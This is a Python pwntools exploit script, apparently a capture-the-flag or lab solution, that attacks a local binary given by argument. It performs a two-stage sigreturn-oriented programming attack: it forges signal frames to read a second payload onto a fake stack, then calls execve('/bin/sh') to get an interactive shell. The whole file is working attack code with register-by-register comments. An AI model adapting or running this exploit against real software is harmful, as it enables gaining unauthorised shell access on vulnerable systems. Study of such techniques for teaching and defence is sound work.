from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *0x41017
continue
'''


def start():
    if (args.QEMU and args.GDB):
        p=process(['qemu-amd64', '-g', '1234', e.path])
        gdb.attach(target=('localhost',1234), exe=e.path, gdbscript=gs)
        return p
    elif (args.QEMU):
        return process(['qemu-amd64', e.path])
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


syscall_ret = r.find_gadget(['syscall', 'ret'])[0]
pop_rax = r.find_gadget(['pop rax', 'ret'])[0]
fake_stack = 0x41500

p = start()

stage1 = '''read(rdi=0x0, rsi=0x41500, rdx=0x1000) '''
frame = SigreturnFrame()
frame.rax = constants.SYS_read   # rax = sys_read (0x0)
frame.rdi = 0x0                  # rdi = stdin (0x0)
frame.rsi = fake_stack           # rsi = fake stack (0x41500)
frame.rdx = 0x1000               # rdx = size to read in
frame.rip = syscall_ret
frame.rsp = fake_stack+0x8       # fake stack+0x8 = 0x41500+0x8

chain = cyclic(8)                # padding
chain += p64(pop_rax)            # pop rax, ret
chain += p64(constants.SYS_rt_sigreturn)  # rax = SYS_rt_sigreturn (0xf)
chain += p64(syscall_ret)        # syscall -> forces sigreturn
chain += bytes(frame)            # read(rdi=0x0, rsi=0x41500, rdx=0x1000)

log.info("Sending Stage 1 SROP")
log.info("Setting RAX = 0x%x " % constants.SYS_rt_sigreturn)
log.info("Calling 0x%x" % syscall_ret)

log.info("[SROP Frame Setting Registers]")
log.info("RAX = 0x%x" % constants.SYS_read)
log.info("RDI = 0x0")
log.info("RSI = 0x%x" % fake_stack)
log.info("RDX = 0x1000")
log.info("RSP = 0x%x" % (fake_stack+8))
log.info("RIP = 0x%x" % syscall_ret)
log.info(stage1)

pause()
p.sendline(chain)                # send first stage-> forces read()

stage2 = '''execve(rdi=0x41500->/bin/sh, rsi=0x0=NULL, rdx=0x0=NULL) '''
frame = SigreturnFrame()
frame.rax = constants.SYS_execve  # rax = sys_execve (0x3b)
frame.rdi = fake_stack           # rdi = fake stack (0x41500)->/bin/sh
frame.rsi = 0x0                  # rsi = NULL (0x0)
frame.rdx = 0x0                  # rdx = NULL (0x0)
frame.rip = syscall_ret

chain = b'/bin/sh\0'             # place /bin/sh at top of fake stack
chain += p64(pop_rax)            # pop rax, ret
chain += p64(constants.SYS_rt_sigreturn)  # rax = SYS_rt_sigreturn (0xf)
chain += p64(syscall_ret)        # syscall -> force sigreturn
chain += bytes(frame)            # execve(rdi->/bin/sh, rsi=NULL, rdx=NULL)

log.info("Sending Stage 2 SROP")
log.info("Setting RAX = 0x%x " % constants.SYS_rt_sigreturn)
log.info("Calling 0x%x" % syscall_ret)

log.info("[SROP Frame Setting Registers]")
log.info("RAX = 0x%x" % constants.SYS_execve)
log.info("RDI = 0x%x" % fake_stack)
log.info("RSI = 0x0")
log.info("RDX = 0x0")
log.info("RIP = 0x%x" % syscall_ret)
log.info(stage2)

pause()
p.sendline(chain)                # send second stage -> forces execve()

p.interactive()
